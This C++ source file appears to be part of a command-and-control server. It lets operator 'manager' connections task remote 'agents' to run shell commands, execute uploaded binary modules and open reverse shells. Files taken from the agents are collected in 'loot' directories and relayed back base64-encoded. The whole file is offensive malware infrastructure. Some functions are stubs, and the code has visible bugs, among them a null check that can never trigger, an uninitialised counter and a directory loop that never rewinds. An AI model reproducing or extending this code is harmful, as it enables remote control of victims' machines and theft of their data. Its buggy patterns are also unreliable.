#include "connection.h"

extern Server *server;
/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(){
    this->data = nullptr;
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler() {
    int operation;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char buff[BUFSIZ];
            
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        dat_ptr = NULL;
        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, 2048);
        memset(tmpbf, 0, sizeof(tmpbf));
        
        // get operation request
        this->transport->read(this->data, &resp, 2048);
        printf("response: %s\n", resp);
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);

        // main switch
        switch (operation)
        {
            // manager is exiting
        case MANAG_EXIT:
            quitting = 1;
            break;

            // Manager wants all of the loot
        case MANAG_GET_LOOT:
            this->send_loot(ptr);
            break;

            // Manager wants to give the agent a file
        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Caught wrong format identifier in input\n", this->transport->get_agent_name(this->data));
                return;
            }

            // splits the options to find path to target file 
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            // gets file from manager
            this->download_file(d_ptr, 1, dat_ptr);

            // tells the agent to download it 
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

            // Manager wants agent to start a reverse shell
        case MANAG_REQ_RVSH:
            AgentInformationHandler::task(AGENT_REV_SHELL, dat_ptr, d_ptr);
            break;

            // Manager wants agent to run a binary module
            // This will be stored in the agent's `tasking` dir
        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            // gets file from Manager
            this->download_file(d_ptr, 1, dat_ptr);
            
            // task agent
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

            // Manager wants to check if loot is available 
        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");

            /*
            UNIMPLEMENTED
            */

            break;

            // Manager wants agent to upload file to server
            // This adds the target file to the agent's `loot` dir
        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }

            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            if(!AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr)) {
                // Tells server tasking was successfully assigned 
                this->transport->send_ok(this->data);
            } else {
                // Tasking failed for some reason
                this->transport->send_err(this->data);
            }
            
            break;

            // Manager wants agent to execute shell command
        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            if(!AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr)){
               // Tells server tasking was successfully assigned 
                this->transport->send_ok(this->data);
            } else {
                // Tasking failed for some reason
                this->transport->send_err(this->data);
            }
            break;

        // rethinking this... dont think the server really needs to know how this works
       /* case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            this->transport->make_agent(this->data, dat_ptr, d_ptr);
            dat_ptr = NULL;
            this->transport->upload_file(this->data, "out/client.out", 0);
            break;*/

            // Manager wants to register a new agent
        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");

             /*
            UNIMPLEMENTED
            */

            break;
            // Manager wants an agent's information
        case MANAG_GET_INFO:
            this->send_info(ptr);
            break;

            // Manager wants all active ports on the server 
            // This is so it can connect to open agent shells
        case MANAG_REQ_PORTS:
            this->get_ports(ptr);
            break;

            // Manager wants to connect to available reverse shell
        case MANAG_CONN_RVSH:
            this->transport->init_reverse_shell(this->data);
            break;

            // Manager wants list of available transport backends
        case MANAG_GET_TRANSPORTS:
            this->send_transports();
            break;

            // Manager wants to start transport backend
        case MANAG_START_TRANSPORT:
            this->setup_transport(ptr);
            break;

            // Unknown operation
        default:
            this->log("Unknown operation value '%d'\n", this->transport->get_agent_name(this->data), operation);
            this->transport->send_err(this->data);
            break;
        }
    }

    // free and exit
    free(resp);
    printf("Thread exiting...\n");
    
}

/*Sends agent information to manager*/
int ConnectionInstance::send_info(char *ptr){
    int size = 0;
    int rc = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char *dat = NULL;
    char *tmpbf = (char*)malloc(3);

    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));

    // open the agent directory 
    if ((dir = opendir ("agents/")) != NULL) {
        // Loop over all agent working directories 
        while ((ent = readdir (dir)) != NULL) {
            // ignore current, parent, and agents.dat
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {

                // open the corresponding agent's info.txt
                // and set up helper buffers 
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                memset(buff, 0, sizeof(buff));
                file = fopen(name, "r");

                // check if file was opened successfully 
                if(file == NULL){
                    // if not, log it and continue to the next directory 
                    this->log("Could not get info on agent %s\n", this->transport->get_agent_name(this->data), ent->d_name);
                    perror("");
                } else {

                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = (char *)malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    printf("File data: %s\n", dat);
                    
                    // Write the data to transport and free it
                    rc = this->transport->write(this->data, dat, size);
                    free(dat);


                    if(rc == 1){
                        this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
                        return 1;
                    }
                    
                    // get response. this is here to keep send/read order 
                    // and avoid lockups due to both ends reading together
                    rc = this->transport->read(this->data, &tmpbf, 3);
                    if(rc == 1){
                        this->log("Failed to read data\n", this->transport->get_agent_name(this->data));
                        return 1;
                    }
                }
            }
        }

        // Tell the manager we are done
        rc = this->transport->write(this->data, "fi", 2);
        if(rc == 1){
            this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        // close directory 
        closedir (dir);
    } else {
        // could not open directory
        this->log("Failed to open directory\n", this->transport->get_agent_name(this->data));
            
        perror ("");
        return 2;
    }
    return 0;
}

/* Downloads file from connected endpoint */
int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
    int rc = 0;
    size_t size = 0;
    size_t size_e = 0;
    const char *data_ptr;
    unsigned char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    FILE *file;


    // Say we are ready for receiving data 
    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    // read the size of the file from target
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = this->transport->read(this->data, (char**)&tmpbuffer, sizeof(tmpbuffer));
    if(rc == 1){
        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    // convert string to integer and allocate sufficient memory
    size = atoi(tmpbuffer);
    data_ptr = (const char *)malloc(size+1);
    memset((void*)data_ptr, 0, size+1);
            
    // ready for data 
    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    // read data until we have read `size` bytes
    size_t tmpint = 0;
    while (tmpint < size)
    {
        rc = this->transport->read(this->data, (char **)&data_ptr+strlen(data_ptr), size-tmpint);
        if(rc == 1){
            this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        
        // add received bytes to total
        tmpint += rc;
    
    }
    
    // get decoded size of data and allocate memory for it
    size_e = B64::dec_size(data_ptr);
    enc_ptr = (unsigned char *)malloc(size_e);

    // try to decode data
    if(!B64::decode(data_ptr, enc_ptr, size_e)){
        
        // Failed
        this->log("Failed to decode data\n", this->transport->get_agent_name(this->data));
        free((void*)data_ptr);
        free(enc_ptr);

        // tell endpoint we failed
        rc = this->transport->send_err(this->data);
        if(rc == 1){
            this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        return 1;
    }

    // free encoded data 
    free((void*)data_ptr);
            
    // say we got it successfully
    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));

    // if its a manager, we write it to an agent's tasking dir
    // else we write it to the agent's loot dir
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->transport->get_agent_name(this->data), ptr);
    }
    
    // open file
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }

    // write and close
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);

    // free decoded data and return
    free(enc_ptr);

    return 0;
}



/* Returns all available ports for accessing reverse shells */
void ConnectionInstance::get_ports(char *ptr){

    /*
    UNIMPLEMENTED
    */

}

/* Sends information about available transport backends*/
void ConnectionInstance::send_transports(){
    printf("Sending transports\n");
    char *buff = (char*)malloc(2048);
    std::vector<int> *tmp_id_vec = server->get_handle_ids();
    int i = 0;
    char *sz = (char*)malloc(128);

    // prints all available handle names from server
    for (const char *name : *(server->get_handle_names())){
        printf("Name: %p\n", name);
    }
    
    // loop over each handle and send info to server
    for(auto it = std::begin(*tmp_id_vec); it!= std::end(*tmp_id_vec); ++it){
        memset(buff, 0, 2048);
        memset(sz, 0, 128);

        // formats id and transport name into desired format
        sprintf(buff, "%s:%d", server->get_handle_names()->at(i),tmp_id_vec->at(i));

        // gets data size
        sprintf(sz, "%ld", strlen(buff));

        printf("Size: %s, String: %s\n", sz, buff);

        // write size
        this->transport->write(this->data, sz, 5);
        memset(sz, 0, 5);
        this->transport->read(this->data, &sz, 3);

        // write data
        this->transport->write(this->data, buff, strlen(buff));
        this->transport->read(this->data, &buff, 3);
        i++;
    }

    // free size
    free(sz);
    
    // tell manager we are done
    int rc = this->transport->write(this->data, "fi", 2);
    if(rc == 1){
        this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
        this->transport->read(this->data, &buff, 3);
        return;
    }
    this->transport->read(this->data, &buff, 3);
        
    
    return;
}

/* Initiates the connection between a manager and connected agent*/
void ConnectionInstance::reverse_shell(){
    printf("Waiting for shell handling...\n");

    /*
    UNIMPLEMENTED
    */

    while(this->shell_finished) sleep(1);
}

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char logbuff[BUFSIZ];
    
    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        memset((void*)buff, 0, sizeof(buff));
        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
        memset((void*)filename, 0, sizeof(filename));
        memset((void*)resp, 0, 2048);
        memset((void*)logbuff, 0, sizeof(logbuff));
        
        // gets the agent's requested tasking operation
        this->transport->read(this->data, &resp, 2048);
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);

        // main decision switch
        switch (operation)
        {
            // Agent wants to exit
        case AGENT_EXIT:
            this->log("Client exiting...\n", this->transport->get_agent_name(this->data)); 
            quitting = 1;
            break;

            // Agent wants to download tasked file
        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
            this->transport->upload_file(this->data, buff, 0);
            break;

            // Agent wants to upload a loot file
        case AGENT_UP_FILE:
            this->download_file(ptr, 0, NULL);
            break;

            // Agent wants to initialize a reverse shell
        case AGENT_REV_SHELL:
            this->log("Agent reverse shell caught\n", this->transport->get_agent_name(this->data));
            //this->server->get_shell_queue()->push(this);
            //this->reverse_shell();
            break;

            // Agent wants to download and execute a module
        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
            this->transport->upload_file(this->data, buff, 1);
            break;

            // unknown operation request
        default:
            this->log("Unknown Operation Identifier: '%d'\n", this->transport->get_agent_name(this->data), operation);
            this->transport->send_err(this->data);
            quitting = 1;
            break;
        }
    }
    free(resp);
}

/* Let instance know that the reverse shell is done*/
void ConnectionInstance::shell_finish(){
    this->shell_finished = 1;
}

/* Initialized the connection and prepares data structures for handlers */
int ConnectionInstance::handle_connection(){
    // reload the logger because of threads not sharing stacks
    this->transport->listen(this->data);
    

    // creates classes and instances
    int handler = this->transport->determine_handler(this->data);

    // determines handler to use
    if (handler == AGENT_TYPE) {
        printf("Starting agent handler\n");
        this->agent_handler();
    } else if(handler == MANAG_TYPE) {
        printf("Starting manager handler\n");
        this->manager_handler();
    } else {
        // failed to handle the parsing :)
        this->log("Got Unknown Handler Type: %d\n", "GENERIC", handler);
        return 1;
    }
    return 0;
}

/* Starts a new transport on the server */
void ConnectionInstance::setup_transport(char *inf){
    printf("Setting up transports\n");
    

    // Gets the target transport ID and listening port
    //char *port_num = inf;
    char tmpid[3] = {0,0,0};

    strncat(tmpid, inf, 2);
    inf +=3;

    printf("id: %s, port_num: %s\n", tmpid, inf);

    // convert strings to ints
    int id = atoi(tmpid);
    int port = atoi(inf);
    
    printf("Integer ID/ports: %d, %d\n", port, id);

    server->listen_instance(id,port);
    
}

/* Sends loot to the manager */
int ConnectionInstance::send_loot(char *ptr){
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbf[3];
    int count;
    int ctr;
    int rc;
    int size;
    int size_e;
    char *tmp_ptr2;
    DIR *dir;
    FILE *file;
    struct dirent *ent;
    
    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    
    this->log("Sending loot\n", this->transport->get_agent_name(this->data));
    

    // open the target loot directory
    count = 0;
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), this->transport->get_agent_name(this->data));
    
    // Count the number of files in the dir
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                count++;
            }
        }

        memset(name, 0, sizeof(name));
        sprintf(name, "%d", count);

        // write count to transport     
        rc = this->transport->write(this->data, name, strlen(name));
        if(rc != 0){
            this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
            return 1;
        }

        rc = this->transport->read(this->data, (char**)&tmpbf, 3);//rd
        if(rc != 0){
            this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
            return 1;
        }

        // If there is nothing to, return
        if(count == 0) return 0;

        /*
        Note: See if we can rework this so it 
              doesnt need to loop through the 
              directory twice
        */

        // Loops again and sends files to server
        while ((ent = readdir (dir)) != NULL) {

            // filters out current and parent dir entries
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {

                // get the file name and open it 
                memset(buff, 0, sizeof(buff));
                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), this->transport->get_agent_name(this->data), ent->d_name);
                
                
                file = fopen(buff, "r");
                if(!file){
                    this->log("Failed to open loot file", this->transport->get_agent_name(this->data));
                    perror("");
                    this->transport->send_err(this->data);
                    return 1;
                }
                
                // writes the file name to transport 
                rc = this->transport->write(this->data, ent->d_name, strlen(ent->d_name));
                if(rc != 0){
                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }

                rc = this->transport->read(this->data, (char**)&tmpbf, 3); //ok
                if(rc != 0){
                    this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }

                
                
                ctr++;
                memset(buff, 0, sizeof(buff));
                
                
                /*
                Note: See if we can replace this with a raw 
                transport->send_file or equiv so we reuse code
                */
                
                // get both the file size and encoded size
                fseek(file, 0L, SEEK_END);
                size = ftell(file);
                size_e = B64::enc_size(size);
                rewind(file);


                // read data into temp buffer
                char tmp_ptr[size];
                memset(tmp_ptr, 0, size);
                fread(tmp_ptr, 1, size, file);
                fclose(file);
                
                // encode data 
                B64::encode((unsigned char*)tmp_ptr, size, &tmp_ptr2);
                
                memset(buff, 0, 256);
                sprintf(buff, "%d", size_e);
                
                // write encoded size to transport 
                rc = this->transport->write(this->data, buff, strlen(buff));
                if(rc != 0){
                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }

                rc = this->transport->read(this->data, (char**)&tmpbf, 3);//ok
                if(rc != 0){
                    this->log("Failed to read from client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }
                

                // write encoded data to transport 
                rc = this->transport->write(this->data, tmp_ptr2, strlen(tmp_ptr2));
                if(rc != 0){
                    this->log("Failed to write to client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }

                // free data
                free(tmp_ptr2);

                // check if we have sent all of the files
                if (ctr >= count)
                {
                    printf("Finished writing loot to channel\n");
                    
                    // tell endpoint we are done here
                    rc = this->transport->write(this->data, "fi", 3);
                    if(rc != 0){
                        this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
                        return 1;
                    }

                    break;
                }                             
                
                // tell endpoint we have more
                rc = this->transport->write(this->data, "nx", 3);
                if(rc != 0){
                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }

                rc = this->transport->read(this->data, (char**)&tmpbf, 3); //rd
                if(rc != 0){
                    this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
                    return 1;
                }
                printf("Read from channel\n");
            
            }
        }
    
    } else {
        /* could not open directory */
        perror ("");
        return 2;
    }

    // close directory handle
    closedir(dir);

    return 0;
}



/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(ptransport_t transport){
    this->transport = transport;
}

/* Returns the transport structure associated with this instance*/
ptransport_t ConnectionInstance::get_transport(){
    return this->transport;
}

/* Returns the transport data associated with this instance*/
void *ConnectionInstance::get_data(){
    return this->data;
}

/* Sets the current thread associated with this instance 
This is mostly for making sure theads dont go out of scope
and accidentally cleaned up during runtime*/
void ConnectionInstance::set_thread(pthread_t thread){
    this->thread = thread;
}

/* Sets the transport data associated with this instance*/
void ConnectionInstance::set_data(void *data){
    this->data = data;
}

/* Sets the server reference */
void ConnectionInstance::set_server(class Server *server){
    this->server = server;
}